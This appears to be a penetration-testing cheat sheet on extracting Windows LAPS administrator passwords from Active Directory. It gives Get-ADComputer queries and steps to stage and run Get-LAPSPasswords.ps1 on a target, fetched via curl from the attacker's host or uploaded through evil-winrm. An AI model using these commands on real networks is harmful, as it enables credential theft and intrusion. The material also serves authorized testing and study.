## Obtain Administrator's Password

1. **Check if You Are in the LAPS_Readers Group**

    ```powershell
    net user <current-username>
    # Global Group memberships  *LAPS_Readers
    ```

- **Use Get-ADComputer**

    **Get-ADComputer** gets the information of the Active Directory computer.

    ```powershell
    Get-ADComputer -Identity '<active-directory-computer-name>' -property 'ms-mcs-admpwd'
    ```

- **Use Get-LAPSPasswords.ps1**

    1. **Download the Payload in Local Machine**

        If you are in LAPS_Readers, you can get the administrator's password using **[Get-LAPSPasswords.ps1](https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1){:target="_blank"}{:rel="noopener"}**.

        ```sh
        wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
        ```

    2. **Transfer the Payload to Target Machine**

        - **via PowerShell**

            First off, open web server in local machine.

            ```sh
            python3 -m http.server 8000
            ```

            Then curl in target machine

            ```powershell
            curl http://<local-ip>:8000/Get-LAPSPasswords.ps1 -o .\Get-LAPSPasswords.ps1
            ```

        - **via Evil-WinRM**

            If you connect the remote Windows machine with Evil-WinRM, you can use directly by adding **-s** flag when connecting.

            ```powershell
            evil-winrm -i <target-ip> -u username -p password -s /path/to/current/directory
            ```

            Then just execute the payload in evil-winrm console.

            ```powershell
            PS > upload .\Get-LAPSPasswords.ps1 c:\Users\<username>\Desktop\Get-LAPSPasswords.ps1
            ```

    3. **Execute the Payload in Target Machine**

        ```powershell
        .\Get-LAPSPasswords.ps1
        ```
